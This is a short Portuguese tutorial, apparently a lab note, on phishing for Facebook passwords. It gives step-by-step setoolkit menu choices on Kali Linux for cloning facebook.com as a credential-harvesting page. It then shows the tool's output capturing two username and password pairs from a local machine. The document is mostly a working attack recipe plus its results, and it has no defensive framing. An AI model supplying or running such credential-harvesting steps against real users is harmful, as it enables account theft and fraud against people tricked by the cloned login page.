# Phishing para captura de senhas do Facebook

### Ferramentas

- Kali Linux
- setoolkit

### Configurando o Phishing no Kali Linux

- Acesso root: ``` sudo su ```
- Iniciando o setoolkit: ``` setoolkit ```
- Tipo de ataque: ``` Social-Engineering Attacks ```
- Vetor de ataque: ``` Web Site Attack Vectors ```
- Método de ataque: ```Credential Harvester Attack Method ```
- Método de ataque: ``` Site Cloner ```
- Obtendo o endereço da máquina: ``` ifconfig ```
- URL para clone: http://www.facebook.com

### Resutados



[*] Credential Harvester Started...
[*] Listening on 0.0.0.0:80
[*] Cloned the website: http://192.168.1.101/login.php
[*] Waiting for credentials, press [ctrl+c] to exit...

[*] WE GOT A HIT! Printing the output:
-----------------------------------------------
[!] HTTP Request Received:
DATE/TIME: 2025-04-18 16:35:02
IP: 192.168.1.102
-----------------------------------------------
USERNAME: admin
PASSWORD: dvwapass123
-----------------------------------------------

[*] WE GOT A HIT! Printing the output:
-----------------------------------------------
[!] HTTP Request Received:
DATE/TIME: 2025-04-18 16:37:49
IP: 192.168.1.102
-----------------------------------------------
USERNAME: testuser
PASSWORD: qwerty123
-----------------------------------------------
